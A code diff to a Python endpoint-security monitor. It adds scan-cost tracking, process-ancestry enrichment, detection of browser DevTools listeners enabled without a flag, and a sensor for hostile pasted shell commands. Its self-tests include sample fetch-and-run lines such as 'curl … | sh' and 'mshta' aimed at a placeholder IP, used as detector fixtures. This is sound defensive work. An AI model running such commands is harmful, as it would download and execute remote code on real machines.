@@ -4705,7 +4705,9 @@ def _record_health(db, health, now):
                     int(item.get("duration_ms") or 0),
                     int(item.get("item_count") or 0), detail, failures, episode))
         event_data = {"sensor_id": sensor_id, "status": status, "detail": detail,
-                      "consecutive_failures": failures}
+                      "consecutive_failures": failures,
+                      "duration_ms": int(item.get("duration_ms") or 0),
+                      "item_count": int(item.get("item_count") or 0)}
         cur = db.execute("INSERT INTO events(occurred_at,observed_at,source,event_type,"
                          "data_json) VALUES(?,?,?,?,?)",
                          (now, now, sensor_id, "sensor.health",
@@ -5390,6 +5392,72 @@ def get_sensor_health():
             "SELECT * FROM sensor_status ORDER BY sensor_id").fetchall())
     finally:
         db.close()
+
+
+# --- Scan cost: the resource budget, measured rather than assumed ---------- #
+# A monitor on a daily-driver machine has an overhead ceiling whether or not
+# anyone wrote it down. Written down: average CPU share, scan CPU over the
+# time between scans, including every command a scan spawns.
+SCAN_CPU_CEILING_PCT = 1.0
+
+
+def _cpu_seconds():
+    """CPU consumed by this process and every command it has waited on.
+    On Windows os.times() reports zero for children, so the share there
+    counts this interpreter only and undercounts every spawned command."""
+    t = os.times()
+    return t.user + t.system + t.children_user + t.children_system
+
+
+def _scan_cost_samples(limit=200):
+    """[(occurred_at, wall_ms, cpu_ms)] for the most recent scans, oldest
+    first. Read from the health EVENTS, which keep one row per scan, not from
+    sensor_status, which keeps only the latest."""
+    db = _event_connection()
+    try:
+        rows = db.execute(
+            "SELECT occurred_at, data_json FROM events WHERE source='scan.cost' "
+            "AND event_type='sensor.health' ORDER BY id DESC LIMIT ?",
+            (int(limit),)).fetchall()
+    finally:
+        db.close()
+    out = []
+    for row in rows:
+        try:
+            d = json.loads(row["data_json"])
+            out.append((int(row["occurred_at"]), int(d.get("duration_ms") or 0),
+                        int(d.get("item_count") or 0)))
+        except Exception:
+            continue
+    return sorted(out)
+
+
+def _scan_cost_summary(samples):
+    """{wall_p50_s, wall_p95_s, cpu_mean_s, share_pct, span_h, scans} over
+    the samples, or None below two of them (a share needs a span)."""
+    samples = sorted(samples)
+    if len(samples) < 2:
+        return None
+    # occurred_at carries one-second resolution, so two scans inside the same
+    # second measure a span of zero. That is a real observation window read
+    # through a coarse clock, not a missing one — and bailing to None there
+    # reported "no history yet" on exactly the hosts fast enough to scan twice
+    # in a second (which is how this line read green on Linux CI and populated
+    # on macOS from the same two scans). Worse, it blinded the case the line
+    # exists to catch: back-to-back scans are ~100% of their own window, so the
+    # share is over any ceiling and doctor has to say so. Floor the span at the
+    # clock's own resolution rather than discarding the observation.
+    span = max(samples[-1][0] - samples[0][0], 1)
+    walls = sorted(s[1] for s in samples)
+
+    def pct(q):
+        return walls[int(round((len(walls) - 1) * q))] / 1000.0
+
+    cpu = sum(s[2] for s in samples) / 1000.0
+    return {"wall_p50_s": pct(0.5), "wall_p95_s": pct(0.95),
+            "cpu_mean_s": cpu / len(samples),
+            "share_pct": 100.0 * cpu / span, "span_h": span / 3600.0,
+            "scans": len(samples)}
 
 
 def _collect_sensor(sensor_id, fn, health, *args):
@@ -7101,6 +7169,7 @@ def check_behavior():
             (base, names, command_sha[:16]),
             fp, program=argv.split(None, 1)[0] if argv else "",
             pid=pid, markers=[n for n, _ in signals], command_sha256=command_sha))
+    _annotate_ancestry(findings)
     return findings
 
 
@@ -9939,10 +10008,35 @@ def _listener_worth_tracking(path):
     return True
 
 
-def _parse_lsof_listeners(text):
+def _browser_loopback_entries(rows):
+    """{'loopback:<path>:<port>': path} for the loopback binds a BROWSER holds
+    without a debugging flag on its command line.
+
+    Loopback listeners are dropped everywhere else in this surface (dev
+    servers churn on 127.0.0.1 constantly), and a browser is the one exception
+    worth the key: a Chromium browser opens a local TCP listener for exactly
+    one thing, DevTools remote debugging, and every path to plaintext cookies
+    from a live profile goes through it. A browser STARTED with
+    --remote-debugging-port is check_browser_automation's case and is skipped
+    here so one fact is not reported twice; what is left is the listener with
+    no flag behind it — CDP enabled in memory (injected into the running
+    browser), which no argv sensor can see. `rows` are (path, port, argv)."""
+    out = {}
+    for path, port, argv in rows:
+        if not path or not _BROWSER_EXE_RE.search(path.strip()):
+            continue
+        if "--remote-debugging" in (argv or ""):
+            continue
+        out["loopback:%s:%s" % (path, port)] = path
+    return out
+
+
+def _parse_lsof_listeners(text, loopback=False):
     """{pid: set(addr)} of NON-loopback TCP listen sockets from `lsof -Fpn`
     machine output (p<pid> / n<addr> field lines). IPv6 brackets handled;
-    127.0.0.1 / ::1 / localhost binds dropped — unreachable from outside."""
+    127.0.0.1 / ::1 / localhost binds dropped — unreachable from outside.
+    `loopback=True` inverts the filter and returns ONLY those binds (for
+    _browser_loopback_entries); the default is unchanged."""
     out = {}
     pid = None
     for line in (text or "").splitlines():
@@ -9953,15 +10047,16 @@ def _parse_lsof_listeners(text):
             pid = val
         elif tag == "n" and pid is not None and ":" in val:
             host = val.rsplit(":", 1)[0].strip("[]")
-            if host in ("127.0.0.1", "::1", "localhost"):
+            if (host in ("127.0.0.1", "::1", "localhost")) != loopback:
                 continue
             out.setdefault(pid, set()).add(val)
     return out
 
 
-def _parse_proc_net_tcp(text):
+def _parse_proc_net_tcp(text, loopback=False):
     """Pure parser: /proc/net/tcp[6] → [(port, uid, inode)] for sockets in state
-    0A (LISTEN) bound to a NON-loopback address. Addresses are little-endian
+    0A (LISTEN) bound to a NON-loopback address (`loopback=True`: ONLY the
+    loopback ones). Addresses are little-endian
     hex; loopback is 0100007F (v4) or ...0100 (v6 ::1), and 00000000 is the
     wildcard 0.0.0.0 — reachable, so kept.
 
@@ -9982,8 +10077,9 @@ def _parse_proc_net_tcp(text):
         except ValueError:
             continue
         a = addr_hex.upper()
-        if a in ("0100007F",                                  # 127.0.0.1
-                 "00000000000000000000000001000000"):         # ::1
+        is_loop = a in ("0100007F",                           # 127.0.0.1
+                        "00000000000000000000000001000000")   # ::1
+        if is_loop != loopback:
             continue
         rows.append((str(port), parts[7], parts[9]))
     return rows
@@ -10028,13 +10124,14 @@ def _linux_socket_inode_pids():
 
 
 def _snapshot_listeners_linux():
-    rows = []
+    rows, loop = [], []
     for proc_file in ("/proc/net/tcp", "/proc/net/tcp6"):
         text = _read_text(proc_file, limit=4 * 1024 * 1024)
         if text is None:
             continue
         rows.extend(_parse_proc_net_tcp(text))
-    if not rows:
+        loop.extend(_parse_proc_net_tcp(text, loopback=True))
+    if not rows and not loop:
         # /proc/net/tcp always exists on Linux; unreadable ⇒ non-answer.
         if not os.path.exists("/proc/net/tcp"):
             return None
@@ -10056,12 +10153,19 @@ def _snapshot_listeners_linux():
         # upgrade). The uid rides in the VALUE, which no diff compares —
         # diff_listeners has no changed_fn, so only new keys ever fire.
         snap["%s:%s" % (path or "?", port)] = {"path": path or "?", "uid": uid}
+    if loop:
+        procs = {p: (exe, argv) for p, _o, exe, argv in _iter_processes()}
+        rows = []
+        for port, _uid, inode in loop:
+            exe, argv = procs.get(inode_pid.get(inode), ("", ""))
+            rows.append((exe, port, argv))
+        snap.update(_browser_loopback_entries(rows))
     return snap
 
 
-def _parse_netstat_listen_windows(text):
+def _parse_netstat_listen_windows(text, loopback=False):
     """Pure parser: `netstat -ano` → [(port, pid)] for non-loopback TCP
-    LISTENING rows."""
+    LISTENING rows (`loopback=True`: ONLY the loopback ones)."""
     rows = []
     for line in (text or "").splitlines():
         parts = line.split()
@@ -10074,7 +10178,7 @@ def _parse_netstat_listen_windows(text):
         if not port.isdigit():
             continue
         host = host.strip("[]")
-        if host in ("127.0.0.1", "::1"):
+        if (host in ("127.0.0.1", "::1")) != loopback:
             continue
         rows.append((port, parts[4]))
     return rows
@@ -10101,13 +10205,18 @@ def _snapshot_listeners_windows():
     out, rc = _netstat_tcp_rows()
     if rc != 0 or not out:
         return None  # non-answer: netstat always prints a header when it runs
-    pid_exe = {pid: exe for pid, _o, exe, _a in _iter_processes()}
+    procs = {pid: (exe, argv) for pid, _o, exe, argv in _iter_processes()}
     snap = {}
     for port, pid in _parse_netstat_listen_windows(out):
-        path = pid_exe.get(pid)
+        path = procs.get(pid, ("", ""))[0]
         if not _listener_worth_tracking(path):
             continue
         snap["%s:%s" % (path or "?", port)] = path or "?"
+    rows = []
+    for port, pid in _parse_netstat_listen_windows(out, loopback=True):
+        exe, argv = procs.get(pid, ("", ""))
+        rows.append((exe, port, argv))
+    snap.update(_browser_loopback_entries(rows))
     return snap
 
 
@@ -10140,6 +10249,18 @@ def snapshot_listeners():
             continue
         for port in sorted({a.rsplit(":", 1)[1] for a in addrs}):
             snap["%s:%s" % (path or "?", port)] = path or "?"
+    loop = _parse_lsof_listeners(out, loopback=True)
+    if loop:
+        # Resolved from the scan-wide process snapshot, not a `ps` per pid: a
+        # dev box holds dozens of loopback listeners and they used to cost
+        # nothing.
+        procs = {p: (exe, argv) for p, _o, exe, argv in _iter_processes()}
+        rows = []
+        for pid, addrs in loop.items():
+            exe, argv = procs.get(pid, ("", ""))
+            for port in sorted({a.rsplit(":", 1)[1] for a in addrs}):
+                rows.append((exe, port, argv))
+        snap.update(_browser_loopback_entries(rows))
     return snap
 
 
@@ -10153,6 +10274,21 @@ def diff_listeners(prior, cur):
         else:
             path, uid = val, None
         port = key.rsplit(":", 1)[1]
+        if key.startswith("loopback:"):
+            return finding(
+                "HIGH", "session-theft",
+                "Browser accepting a local debug connection",
+                "%s is listening on loopback port %s with no "
+                "--remote-debugging-port on its command line. A Chromium "
+                "browser opens a local TCP listener for one thing — DevTools "
+                "remote debugging — so a listener that appeared without the "
+                "flag is the in-memory enable (CDP injected into the running "
+                "browser). Anything on this machine can read your live cookies "
+                "as PLAINTEXT through it, which defeats MFA. If you did not "
+                "start this, freeze the browser: aegis.py freeze <pid>."
+                % (os.path.basename(path), port),
+                "listener:%s" % key, path=path, port=port, confidence="high",
+                markers=["session-theft", "cookie", "browser-automation"])
         resolvable = path.startswith("/") or (IS_WIN and ":" in path[:3])
         trust = classify_signature(path)["trust"] if resolvable else "unknown"
         # On Linux there is no signature to lean on, so the hostile shape is
@@ -12645,10 +12781,19 @@ def _credential_path_tokens():
 
 AGENT_CONFIG_ROOTS = [os.path.join(HOME, d) for d in (
     ".claude", ".codex", ".cursor", ".gemini", ".continue", ".aider",
+    ".copilot", ".hermes", ".codeium/windsurf", ".config/opencode",
+    ".config/zed",
     "Library/Application Support/Claude",
     "Library/Application Support/Code/User",
-    ".config/claude", ".config/Code/User",
+    ".config/claude", ".config/Claude", ".config/Code/User",
+    "AppData/Roaming/Claude", "AppData/Roaming/Code/User",
 )]
+
+# Registries that live as a single file OUTSIDE any agent directory, so no
+# root walk reaches them. ~/.claude.json is Claude Code's user-level
+# `mcpServers` store — the primary MCP registration on this machine — and it
+# sits in $HOME itself, a root nothing here may walk.
+AGENT_CONFIG_FILES = [os.path.join(HOME, f) for f in (".claude.json",)]
 
 # Instruction files: natural language that an agent treats as standing orders.
 AGENT_INSTRUCTION_NAMES = (
@@ -14409,6 +14554,10 @@ def _agent_config_files():
         _AGENT_SCAN_TRUNCATED[0] = True
         if root not in _AGENT_SCAN_TRUNCATED_ROOTS:
             _AGENT_SCAN_TRUNCATED_ROOTS.append(root)
+
+    for p in AGENT_CONFIG_FILES:
+        if os.path.isfile(p) and not os.path.islink(p):
+            seen.append(p)
 
     # A root refused by the ROOT cap was not partially walked, it was never
     # opened — indistinguishable from clean unless it is named, which is the
@@ -16444,6 +16593,7 @@ def gather_all(baseline_snap, current_snap, health=None):
         # scan behaviour — the opt-in is the arming, not a config flag.
         ("latch", check_latches, ()),
         ("decoy", check_decoys, ()),
+        ("paste-guard", check_paste_guard, ()),
         ("assay", check_assay, ()),
         ("outbound", check_outbound, ()),
         ("web-protection", check_web_protection, ()),
@@ -17139,6 +17289,7 @@ def _cmd_scan_locked(quiet=False):
     _PROC_ENUM_FAILED = False
     _PROC_ARGV_PARTIAL = False
     health = []
+    scan_started, cpu_started = time.monotonic(), _cpu_seconds()
     baseline, baseline_corrupt = load_baseline()
     first_run = baseline is None and not baseline_corrupt
     current = _collect_sensor("persistence.snapshot", snapshot_persistence,
@@ -17248,6 +17399,12 @@ def _cmd_scan_locked(quiet=False):
                    "were NOT vouched for" % _SIG_PROBE_FAILURES)
         if _SIG_PROBE_FAILURES else "",
         "duration_ms": 0, "item_count": _SIG_PROBE_FAILURES})
+    # The scan's own cost, recorded where every other coverage fact is so it
+    # is durable per scan. duration_ms is wall time; item_count is CPU
+    # milliseconds for this process AND every command it waited on.
+    health.append({"sensor_id": "scan.cost", "status": "OK", "detail": "",
+                   "duration_ms": int((time.monotonic() - scan_started) * 1000),
+                   "item_count": int((_cpu_seconds() - cpu_started) * 1000)})
 
     # Captured BEFORE emit, which is what updates the ledger: this is the set
     # the previous scan had already reported, and the difference against it is
@@ -18718,6 +18875,19 @@ def cmd_doctor():
     print("  %s %-27s %s" % (a_mark, "positive controls", a_text))
     if a_mark != "✓":
         problems.append("assay coverage")
+    cost = _scan_cost_summary(_scan_cost_samples())
+    if cost is None:
+        print("  · %-27s no history yet (two scans needed)" % "scan cost")
+    else:
+        over = cost["share_pct"] > SCAN_CPU_CEILING_PCT
+        print("  %s %-27s cpu %.1fs/scan, wall p50 %.1fs p95 %.1fs, %.2f%% of "
+              "the last %.1fh over %d scans (ceiling %.0f%%)"
+              % ("?" if over else "✓", "scan cost", cost["cpu_mean_s"],
+                 cost["wall_p50_s"], cost["wall_p95_s"], cost["share_pct"],
+                 cost["span_h"], cost["scans"], SCAN_CPU_CEILING_PCT))
+        if over:
+            problems.append("scan cost")
+
     # --- liveness -----------------------------------------------------------
     # doctor contained no read_heartbeat() call at all. The beat is the signal
     # every OTHER watcher on this machine keys on — `aegis.py watchdog`, the
@@ -21308,6 +21478,129 @@ _WIN_PPID_PS = (
     "$t=[char]9;Get-CimInstance Win32_Process | ForEach-Object {"
     "(($_.ProcessId),($_.ParentProcessId)) -join $t}")
 
+_WIN_ANCESTRY_PS = (
+    "$t=[char]9;Get-CimInstance Win32_Process | ForEach-Object {"
+    "(($_.ProcessId),($_.ParentProcessId),($_.CreationDate)) -join $t}")
+
+# Ancestry walk bound. Eight parents reaches the login session from any
+# interactive shell; past that the chain is init and says nothing new.
+ANCESTRY_MAX_DEPTH = 8
+
+
+def _parse_ps_ancestry(text):
+    """{pid: (ppid, lstart)} from `ps -axo pid=,ppid=,lstart=`. lstart is the
+    remainder of the line — a multi-word date, so it cannot be split on
+    whitespace like the two numeric columns before it."""
+    out = {}
+    for line in (text or "").splitlines():
+        parts = line.split(None, 2)
+        if len(parts) == 3 and parts[0].isdigit():
+            out[parts[0]] = (parts[1], parts[2].strip())
+    return out
+
+
+def _process_ancestry_table():
+    """{pid: (ppid, start)} for every visible process, one call per platform.
+
+    `start` is the creation token _process_start_token reads per pid, carried
+    for the whole table so a walk can refuse a parent that started AFTER its
+    child: a bare ppid is a reusable slot, and the slot's current occupant is
+    not necessarily the process that forked this one."""
+    out = {}
+    if IS_LINUX:
+        try:
+            pids = [d for d in os.listdir("/proc") if d.isdigit()]
+        except Exception:
+            return out
+        for pid in pids:
+            try:
+                with open("/proc/%s/stat" % pid, encoding="utf-8",
+                          errors="replace") as f:
+                    data = f.read()
+            except Exception:
+                continue
+            tail = data[data.rfind(")") + 1:].split()
+            if len(tail) > 19:
+                out[pid] = (tail[1], tail[19])          # ppid, starttime
+        return out
+    if IS_WIN:
+        o, _e, rc = run(["powershell", "-NoProfile", "-NonInteractive",
+                         "-Command", _WIN_ANCESTRY_PS], timeout=120)
+        if rc != 0 or not o:
+            return out
+        for line in o.splitlines():
+            parts = line.rstrip("\r").split("\t")
+            if len(parts) >= 3 and parts[0].strip().isdigit():
+                out[parts[0].strip()] = (parts[1].strip(), parts[2].strip())
+        return out
+    o, _e, rc = run(["ps", "-axo", "pid=,ppid=,lstart="], timeout=15)
+    if rc != 0:
+        return out
+    return _parse_ps_ancestry(o)
+
+
+def _start_epoch(token):
+    """A comparable number from a start token, or None. Linux starttime is
+    jiffies since boot (a number already); macOS lstart is
+    'Tue Sep  2 10:00:00 2026'. Windows CreationDate is locale-formatted and
+    is left unparsed, so the reuse check does not run there — stated, not
+    hidden."""
+    if token is None:
+        return None
+    tok = str(token).strip()
+    if tok.isdigit():
+        return float(tok)
+    try:
+        return time.mktime(time.strptime(tok, "%a %b %d %H:%M:%S %Y"))
+    except (ValueError, OverflowError):
+        return None
+
+
+def _ancestry(pid, table, depth=ANCESTRY_MAX_DEPTH):
+    """[ppid, grandparent, ...] up the chain from `pid`, at most `depth` long.
+
+    Keyed on (pid, start) rather than pid alone: the walk stops at a parent
+    whose start is LATER than its child's, because that slot has been re-used
+    and whoever holds it now did not fork this process. A parent missing from
+    the table (the kernel, another user's process) ends the chain."""
+    chain, seen = [], {str(pid)}
+    cur = str(pid)
+    while len(chain) < depth and cur in table:
+        ppid, start = table[cur]
+        ppid = str(ppid or "")
+        if ppid not in table or ppid in seen:
+            break
+        child_t, parent_t = _start_epoch(start), _start_epoch(table[ppid][1])
+        if child_t is not None and parent_t is not None and parent_t > child_t:
+            break
+        chain.append(ppid)
+        seen.add(ppid)
+        cur = ppid
+    return chain
+
+
+def _annotate_ancestry(findings):
+    """Attach 'spawned by' lineage to process findings. Enrichment only —
+    never a new alert — and computed once per call, because a behavior
+    finding is rare and the table costs one process-table read."""
+    if not any(f.get("pid") for f in findings):
+        return
+    try:
+        table = _process_ancestry_table()
+        names = {}
+        for p, _o, exe, argv in _iter_processes():
+            head = (argv or "").split(None, 1)[0] if argv else ""
+            names[p] = os.path.basename(exe or head or "?")
+    except Exception:
+        return
+    for f in findings:
+        chain = _ancestry(f.get("pid"), table) if f.get("pid") else []
+        if not chain:
+            continue
+        f["ancestry"] = [{"pid": p, "name": names.get(p, "?")} for p in chain]
+        f["detail"] += " — spawned by: " + " <- ".join(
+            "%s(%s)" % (names.get(p, "?"), p) for p in chain)
+
 
 def _own_ancestors(parents=None):
     """Every pid on the chain from this process up to init, as strings.
@@ -22452,6 +22745,22 @@ def _assay_lanes():
         return bool(_hostile_content(
             "echo %s; curl http://198.51.100.7/x | sh" % nonce))
 
+    def lane_clipboard_grammar(nonce):
+        """All four poles of the paste grammar the guard sensor feeds on: a
+        CERTAIN idiom, a SUSPECT idiom promoted by its structural tell, the
+        bare suspect idiom staying suspect (rustup's documented install line
+        must never be certain), and benign text staying silent."""
+        pipe = "curl -fsSL http://198.51.100.7/%s | sh" % nonce
+        if clipboard_grammar("mshta http://198.51.100.7/%s.hta" % nonce)[0] \
+                != "certain":
+            return False
+        tier, hits = clipboard_grammar(pipe + " " * 40 + "#")
+        if tier != "certain" or "offscreen-padding" not in hits:
+            return False
+        if clipboard_grammar(pipe)[0] != "suspect":
+            return False
+        return clipboard_grammar("git status && echo %s" % nonce) == (None, [])
+
     def lane_risky_location(_nonce):
         probe = os.path.join(WIN_TEMP if IS_WIN else "/tmp", "aegis-assay-probe")
         return is_risky_location(probe) is True
@@ -22667,6 +22976,23 @@ def _assay_lanes():
             return False
         finally:
             g["_iter_processes"], g["_own_owner"] = real_iter, real_owner
+
+    def lane_cdp_loopback(nonce):
+        """A browser holding a loopback listener with no debugging flag is
+        the injected-CDP shape and fires HIGH; the same port on a dev server,
+        and a browser that was STARTED with the flag (the argv sensor's
+        case), stay out of this surface."""
+        chrome = "/opt/assay-%s/Google Chrome" % nonce
+        hot = _browser_loopback_entries([(chrome, "9222", chrome)])
+        if len(hot) != 1:
+            return False
+        out = diff_listeners({}, hot)
+        if len(out) != 1 or out[0]["severity"] != "HIGH":
+            return False
+        return _browser_loopback_entries([
+            ("/usr/local/bin/node", "3000", "node server.js"),
+            (chrome, "9222", chrome + " --remote-debugging-port=9222"),
+            (None, "9222", "")]) == {}
 
     def lane_ext_cap_gain(_nonce):
         """An extension GAINING a session-reaching capability is reported;
@@ -23022,6 +23348,9 @@ def _assay_lanes():
          lane_agent_exec_target),
         ("session-theft", "live-profile browser automation still scores CRITICAL",
          lane_session_theft),
+        ("cdp-loopback",
+         "browser loopback listener without the flag fires; dev server and "
+         "flagged browser stay silent", lane_cdp_loopback),
         ("ext-cap-gain", "extension capability GAIN fires, steady state does not",
          lane_ext_cap_gain),
         ("glean-atoms", "retro-hunt still requires >=3 atoms and ALL of them",
@@ -23045,6 +23374,9 @@ def _assay_lanes():
          lane_sysmon_scoring),
         ("hostile-content", "shell-content grammar still matches",
          lane_hostile_content),
+        ("clipboard-grammar",
+         "paste grammar: certain fires, padding promotes, suspect stays, "
+         "benign is silent", lane_clipboard_grammar),
         ("risky-location", "volatile exec dirs still rate as risky",
          lane_risky_location),
         ("severity-scale", "vendor-label impersonation still rates HIGH+",
@@ -25700,6 +26032,103 @@ def _guard_paths():
             os.path.join(GUARD_DIR, "guard.bash"))
 
 
+def _guard_cursor_path():
+    return os.path.join(GUARD_DIR, "cursor.json")
+
+
+def _paste_guard_finding(rec):
+    """One guard observation -> one finding, or None for a row that carries no
+    verdict. Severity follows the clipboard tiers; confidence follows paste
+    provenance, which is the tri-state `guard observe` recorded (zsh proves a
+    paste, bash cannot, and unknown is never rendered as typed)."""
+    if not isinstance(rec, dict):
+        return None
+    cmd = str(rec.get("cmd") or "")
+    tier, pasted = rec.get("tier"), rec.get("pasted")
+    names = sorted(set(list(rec.get("hits") or []) +
+                       list(rec.get("hostile") or [])))
+    if not cmd or (not tier and not names):
+        return None
+    if tier == "certain":
+        sev, conf = "HIGH", ("high" if pasted else "medium")
+    elif pasted is True:
+        sev, conf = "MEDIUM", "medium"
+    else:
+        # Typed by hand, or a shell that cannot tell: `curl … | sh` is how
+        # rustup is documented, so without paste provenance this is a digest
+        # line, not an interrupt.
+        sev, conf = "LOW", "low"
+    how = {True: "was PASTED into", False: "was typed into"}.get(
+        pasted, "ran in (paste provenance unknown)")
+    program = cmd.split(None, 1)[0] if cmd else ""
+    return finding(
+        sev, "paste-guard",
+        "Hostile command line %s a shell"
+        % ("pasted into" if pasted else "ran in"),
+        "A command matching [%s] %s an interactive shell at %s: %s"
+        % (", ".join(names), how, rec.get("ts") or "?",
+           re.sub(r"\s+", " ", cmd)[:200]),
+        "paste-guard:%s:%s" % (tier or "hostile",
+                               hashlib.sha256(cmd.encode()).hexdigest()[:16]),
+        program=program, pasted=pasted, tier=tier, observed_at=rec.get("ts"),
+        markers=["paste-guard"] + names, confidence=conf)
+
+
+def check_paste_guard():
+    """Sensor: what the shell guard observed since the last scan.
+
+    `guard observe` already runs clipboard_grammar over every executed command
+    line with paste provenance attached — the ClickFix shape at the moment it
+    executes — but its log was only ever read by `guard status`. This reads it
+    into the scan, so a pasted hostile line is an incident with correlation
+    and a health row, not a number the operator has to remember to ask for.
+
+    Returns [] when the hook was never installed (absent, not degraded), None
+    when it is installed but its log cannot be read. The cursor is a byte
+    offset and nothing else: the log itself holds only hostile lines, and a
+    clean command line never reaches it."""
+    zsh_p, bash_p = _guard_paths()
+    if not (os.path.isfile(zsh_p) or os.path.isfile(bash_p)):
+        return []
+    cursor = load_json(_guard_cursor_path(), None)
+    try:
+        size = os.path.getsize(GUARD_LOG)
+    except FileNotFoundError:
+        if not isinstance(cursor, dict):
+            save_json(_guard_cursor_path(), {"offset": 0})
+        return []
+    except OSError:
+        return None
+    if not isinstance(cursor, dict):
+        # An install that predates this sensor: adopt what `guard status` has
+        # already shown the operator rather than re-alerting months of it.
+        save_json(_guard_cursor_path(), {"offset": size})
+        return []
+    offset = int(cursor.get("offset") or 0)
+    if offset > size:
+        offset = 0          # rotated or truncated underneath us
+    try:
+        with open(GUARD_LOG, "rb") as f:
+            f.seek(offset)
+            data = f.read()
+    except OSError:
+        return None
+    # Only whole lines are consumed: a scan racing the hook mid-append must
+    # leave the partial record for the next scan, not skip past it.
+    consumed = data.rfind(b"\n") + 1
+    findings = []
+    for line in data[:consumed].decode("utf-8", "replace").splitlines():
+        try:
+            rec = json.loads(line)
+        except Exception:
+            continue
+        f = _paste_guard_finding(rec)
+        if f:
+            findings.append(f)
+    save_json(_guard_cursor_path(), {"offset": offset + consumed})
+    return findings
+
+
 def cmd_guard(action="status", rest=None):
     ensure_state()
     os.makedirs(GUARD_DIR, mode=0o700, exist_ok=True)
@@ -25743,16 +26172,16 @@ def cmd_guard(action="status", rest=None):
         pasted = True if raw == "1" else (False if raw == "0" else None)
         hostile = _hostile_content(cmdline)
         try:
-            tier, _grammar_hits = clipboard_grammar(cmdline)
+            tier, grammar_hits = clipboard_grammar(cmdline)
         except Exception:
-            tier = None
+            tier, grammar_hits = None, []
         # Nothing about a clean command line is ever recorded — not the text,
         # not a hash. The same discipline the clipboard command already keeps,
         # for the same reason: password managers put secrets here.
         if not hostile and not tier:
             return 0
         rec = {"ts": now_iso(), "pasted": pasted, "tier": tier,
-               "hostile": hostile,
+               "hostile": hostile, "hits": grammar_hits,
                "cmd": redact_sensitive(cmdline[:400])}
         try:
             os.makedirs(GUARD_DIR, mode=0o700, exist_ok=True)
